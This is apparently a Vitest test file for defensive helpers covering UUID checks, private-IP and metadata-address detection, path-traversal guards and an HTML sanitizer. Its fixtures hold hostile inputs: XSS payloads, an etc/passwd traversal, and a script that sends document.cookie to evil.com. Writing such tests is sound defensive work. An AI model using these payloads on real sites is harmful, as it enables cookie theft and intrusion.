import { describe, expect, it } from 'vitest';
import { isPathWithinBase } from '../src/utils/is-path-within-base.js';
import { isPrivateAddress } from '../src/utils/is-private-address.js';
import { isValidUuid } from '../src/utils/is-valid-uuid.js';
import { sanitizeSearchHeadline } from '../src/utils/sanitize-search-headline.js';

describe('isValidUuid', () => {
  it('returns true for valid lowercase UUID', () => {
    expect(isValidUuid('550e8400-e29b-41d4-a716-446655440000')).toBe(true);
  });

  it('returns true for valid uppercase UUID', () => {
    expect(isValidUuid('550E8400-E29B-41D4-A716-446655440000')).toBe(true);
  });

  it('returns true for valid mixed case UUID', () => {
    expect(isValidUuid('550e8400-E29B-41d4-A716-446655440000')).toBe(true);
  });

  it('returns false for invalid UUID', () => {
    expect(isValidUuid('not-a-uuid')).toBe(false);
    expect(isValidUuid('550e8400-e29b-41d4-a716')).toBe(false);
    expect(isValidUuid('')).toBe(false);
    expect(isValidUuid('550e8400e29b41d4a716446655440000')).toBe(false);
  });
});

describe('isPrivateAddress', () => {
  it('flags the cloud metadata address', () => {
    expect(isPrivateAddress('169.254.169.254')).toBe(true);
  });

  it('flags every private IPv4 range', () => {
    for (const address of [
      '0.0.0.0',
      '10.1.2.3',
      '127.0.0.1',
      '100.64.0.1',
      '172.16.0.1',
      '172.31.255.255',
      '192.168.1.1',
    ]) {
      expect(isPrivateAddress(address), address).toBe(true);
    }
  });

  it('allows public IPv4', () => {
    expect(isPrivateAddress('8.8.8.8')).toBe(false);
    expect(isPrivateAddress('172.32.0.1')).toBe(false);
    expect(isPrivateAddress('100.128.0.1')).toBe(false);
    expect(isPrivateAddress('192.169.1.1')).toBe(false);
  });

  it('flags IPv4-mapped IPv6 forms', () => {
    expect(isPrivateAddress('::ffff:10.0.0.1')).toBe(true);
    expect(isPrivateAddress('[::ffff:127.0.0.1]')).toBe(true);
    expect(isPrivateAddress('::ffff:8.8.8.8')).toBe(false);
    expect(isPrivateAddress('::ffff:7f00:1')).toBe(true);
    expect(isPrivateAddress('[::ffff:7f00:1]')).toBe(true);
  });

  it('flags IPv6 loopback, unique-local and link-local', () => {
    expect(isPrivateAddress('::1')).toBe(true);
    expect(isPrivateAddress('[::1]')).toBe(true);
    expect(isPrivateAddress('fc00::1')).toBe(true);
    expect(isPrivateAddress('fd12:3456::1')).toBe(true);
    expect(isPrivateAddress('fe80::1')).toBe(true);
    expect(isPrivateAddress('2001:4860:4860::8888')).toBe(false);
  });

  it('flags NAT64, multicast and reserved space', () => {
    expect(isPrivateAddress('64:ff9b::a00:1')).toBe(true);
    expect(isPrivateAddress('224.0.0.1')).toBe(true);
    expect(isPrivateAddress('255.255.255.255')).toBe(true);
    expect(isPrivateAddress('ff02::1')).toBe(true);
  });
});

describe('isPathWithinBase', () => {
  it('returns true for path within base', () => {
    expect(isPathWithinBase('/uploads', 'user123', 'photo.jpg')).toBe(true);
  });

  it('returns false for path traversal attempt', () => {
    expect(isPathWithinBase('/uploads', '..', 'etc', 'passwd')).toBe(false);
    expect(isPathWithinBase('/uploads', 'user/../..', 'secret')).toBe(false);
  });

  it('returns true for base path itself', () => {
    expect(isPathWithinBase('/uploads')).toBe(true);
  });
});

describe('sanitizeSearchHeadline', () => {
  it('returns empty string for null input', () => {
    expect(sanitizeSearchHeadline(null)).toBe('');
  });

  it('returns empty string for undefined input', () => {
    expect(sanitizeSearchHeadline(undefined)).toBe('');
  });

  it('returns empty string for empty string input', () => {
    expect(sanitizeSearchHeadline('')).toBe('');
  });

  it('preserves <mark> tags from ts_headline', () => {
    const input = 'Hello <mark>World</mark>!';
    expect(sanitizeSearchHeadline(input)).toBe('Hello <mark>World</mark>!');
  });

  it('preserves multiple <mark> tags', () => {
    const input = '<mark>John</mark> works at <mark>Acme</mark> Corp';
    expect(sanitizeSearchHeadline(input)).toBe('<mark>John</mark> works at <mark>Acme</mark> Corp');
  });

  it('escapes HTML entities outside of mark tags', () => {
    const input = '<mark>Test</mark> with <b>bold</b> & "quotes"';
    expect(sanitizeSearchHeadline(input)).toBe(
      '<mark>Test</mark> with &lt;b&gt;bold&lt;/b&gt; &amp; &quot;quotes&quot;',
    );
  });

  it('prevents script tag XSS attacks', () => {
    const input = '<mark>John</mark><script>alert("xss")</script>';
    const result = sanitizeSearchHeadline(input);
    expect(result).not.toContain('<script>');
    expect(result).toBe('<mark>John</mark>&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;');
  });

  it('prevents img tag XSS attacks', () => {
    const input = '<mark>User</mark><img src=x onerror=alert(1)>';
    const result = sanitizeSearchHeadline(input);
    expect(result).not.toContain('<img');
    expect(result).toBe('<mark>User</mark>&lt;img src=x onerror=alert(1)&gt;');
  });

  it('prevents event handler XSS attacks', () => {
    const input = '<mark onmouseover="alert(1)">Test</mark>';
    // The mark tag itself is preserved but any attributes would be escaped
    // since we replace exact <mark> and </mark> only
    const result = sanitizeSearchHeadline(input);
    expect(result).toBe('&lt;mark onmouseover=&quot;alert(1)&quot;&gt;Test</mark>');
  });

  it('handles malicious content in display_name field', () => {
    // Simulates: friend.display_name = '<script>document.location="evil.com?c="+document.cookie</script>'
    const input =
      '<script>document.location="evil.com?c="+document.cookie</script> <mark>matched</mark>';
    const result = sanitizeSearchHeadline(input);
    expect(result).not.toContain('<script>');
    expect(result).toContain('<mark>matched</mark>');
  });

  it('handles case-insensitive mark tags', () => {
    const input = '<MARK>Test</MARK> and <Mark>Another</Mark>';
    expect(sanitizeSearchHeadline(input)).toBe('<mark>Test</mark> and <mark>Another</mark>');
  });

  it('escapes ampersands', () => {
    const input = 'Tom & <mark>Jerry</mark>';
    expect(sanitizeSearchHeadline(input)).toBe('Tom &amp; <mark>Jerry</mark>');
  });

  it('escapes single quotes', () => {
    const input = "It's <mark>great</mark>";
    expect(sanitizeSearchHeadline(input)).toBe('It&#x27;s <mark>great</mark>');
  });

  it('handles nested/malformed mark tags safely', () => {
    const input = '<mark><mark>double</mark></mark>';
    const result = sanitizeSearchHeadline(input);
    // Inner malformed structure should be escaped
    expect(result).toBe('<mark><mark>double</mark></mark>');
  });

  it('handles unicode content', () => {
    const input = '<mark>Muller</mark> works at Munchen GmbH';
    expect(sanitizeSearchHeadline(input)).toBe('<mark>Muller</mark> works at Munchen GmbH');
  });

  it('is not vulnerable to placeholder injection', () => {
    // Try to inject static placeholder-like strings - they should be escaped, not become mark tags
    const input = '__MARK_OPEN__Test__MARK_CLOSE__';
    const result = sanitizeSearchHeadline(input);
    // Should be treated as plain text, not converted to mark tags
    expect(result).toBe('__MARK_OPEN__Test__MARK_CLOSE__');
    expect(result).not.toContain('<mark>');
  });

  it('handles null byte injection attempts', () => {
    // Null bytes and other control characters should be handled safely
    const input = '<mark>Test</mark>\u0000<script>alert(1)</script>';
    const result = sanitizeSearchHeadline(input);
    expect(result).toContain('<mark>Test</mark>');
    expect(result).not.toContain('<script>');
  });
});
